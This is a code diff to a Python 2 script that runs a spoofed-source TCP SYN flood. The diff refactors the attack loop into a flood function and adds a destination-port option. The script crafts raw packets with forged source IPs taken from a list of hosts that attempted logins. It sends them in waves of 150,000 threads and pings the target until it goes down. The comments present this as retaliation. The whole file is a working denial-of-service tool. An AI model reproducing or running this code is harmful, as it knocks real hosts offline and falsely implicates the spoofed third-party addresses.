@@ -7,6 +7,8 @@ import time
 import sys
 import os
 
+tic = time.time()
+
 
 def checksum(msg):                                  # calculates checksum of message
     s = 0
@@ -31,7 +33,7 @@ def create_raw_socket():
     return s
 
 
-def create_and_send_syn(source_ip, dest_ip):
+def create_and_send_syn(source_ip, dest_ip, dport):
     s = create_raw_socket()
     # start constructing the packet
     ihl = 5            # ip header fields
@@ -51,8 +53,8 @@ def create_and_send_syn(source_ip, dest_ip):
     ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol,
                      check, saddr, daddr)
 
-    source = id  # source port
-    dest = 80  # destination port
+    source = id   # source port
+    dest = dport  # destination port
     seq = 0
     ack_seq = 0
     doff = 5  # 4 bit field, size of tcp header, 5 * 4 = 20 bytes
@@ -86,62 +88,70 @@ def create_and_send_syn(source_ip, dest_ip):
 
     # final full packet - syn packets dont have any data
     packet = ip_header + tcp_header #+ 'A'*1000
-    # packet += 'A'*1000
-    # s.connect((dest_ip, 22))
-    # time.sleep(10)
     s.sendto(packet, (dest_ip, 0))
-    # s.send(packet)
-    # time.sleep(10)
-    #s.close()
+    # s.close()
     return s
 
 
 def pull_shitlist_data():
     target_pool = []
-    for line in utils.swap('unique.txt', False):
-        ip = line.split('\t')[0]
-        target_pool.append(ip)
+    for ln in utils.swap('unique.txt', False):
+        target_pool.append(ln.split('\t')[0])
     return target_pool
 
 
-tic = time.time()
-alive = True
-N_THREADS = 150000
-TARGET_HOST = '10.0.0.1'  # Someone on the shitlist with over 100+ attempts to login
-if 'target' and len(sys.argv) >= 3:
-    TARGET_HOST = sys.argv[2]
-spoof_pool = pull_shitlist_data()
-waves = 0
-while alive:
-    attack = {}
-    print 'STARTING \033[1m\033[31m%d\033[0m SIMULTANEOUS SYN-Packets @ %s' % (N_THREADS, TARGET_HOST)
-    for ii in range(N_THREADS):
-        try:    # get a random IP address
-            src = spoof_pool.pop()
-        except IndexError:
-            spoof_pool = pull_shitlist_data()
-            src = spoof_pool.pop()
-            pass
-        attack[ii] = threading.Thread(target=create_and_send_syn, args=(src, TARGET_HOST))
-    for jj in range(N_THREADS):
-        attack[jj].start()
-    for kk in range(N_THREADS):
-        attack[kk].join()
-    print 'Attack Wave %d Finished [%ss Elapsed]' % (waves, str(time.time()-tic))
-    waves += 1
-    # Ping the target (or try to) and see if they're still there
-    os.system('ping -c 1 %s >> ruthere.txt' % TARGET_HOST)
-    alive = utils.swap('ruthere.txt', True)
-    for line in alive:
-    # print line
+def flood(port, TARGET_HOST, N_THREADS):
+    alive = True
+    spoof_pool = pull_shitlist_data()
+    waves = 0
+    while alive:
+        attack = {}
+        print 'STARTING \033[1m\033[31m%d\033[0m SIMULTANEOUS SYN-Packets @ %s' % (N_THREADS, TARGET_HOST)
+        for ii in range(N_THREADS):
+            try:  # get a random IP address
+                src = spoof_pool.pop()
+            except IndexError:
+                spoof_pool = pull_shitlist_data()
+                src = spoof_pool.pop()
+                pass
+            attack[ii] = threading.Thread(target=create_and_send_syn, args=(src, TARGET_HOST, port))
+        for jj in range(N_THREADS):
+            attack[jj].start()
+        for kk in range(N_THREADS):
+            attack[kk].join()
+        print 'Attack Wave %d Finished [%ss Elapsed]' % (waves, str(time.time() - tic))
+        waves += 1
+
+        # Ping the target (or try to) and see if they're still there
+        os.system('ping -c 1 %s >> ruthere.txt' % TARGET_HOST)
+        for line in utils.swap('ruthere.txt', True):
+            try:
+                ttl = line.split('64 bytes from ')[1]
+            except IndexError:
+                pass
         try:
-            ttl = line.split('64 bytes from ')[1]
-        except IndexError:
-            pass
+            if ttl:
+                print '%s is still Alive:' % TARGET_HOST
+                print ttl
+        except NameError:
+            print '[*] Remote Host DOWN'
+            alive = False
+    return alive, waves
+
+
+if __name__ == '__main__':
+    target = '10.0.0.1'  # Someone on the shit_list with over 100+ attempts to login
+    n_threads = 150000
+    dport = 80
+
+    if 'target' and len(sys.argv) >= 3:
+        target = sys.argv[2]
+    if '-p' in sys.argv:
+        dport = int(sys.argv[4])
+
     try:
-        if ttl:
-            print '%s is still Alive:' % TARGET_HOST
-            print ttl
-    except NameError:
-        print '[*] Remote Host DOWN'
-        alive = False
+        killed, n_waves = flood(dport, target, n_threads)
+    except KeyboardInterrupt:
+        print '[!!] Attack Killed after %d waves [%ss Elapsed]' % \
+              (n_waves, str(time.time() - tic))
+
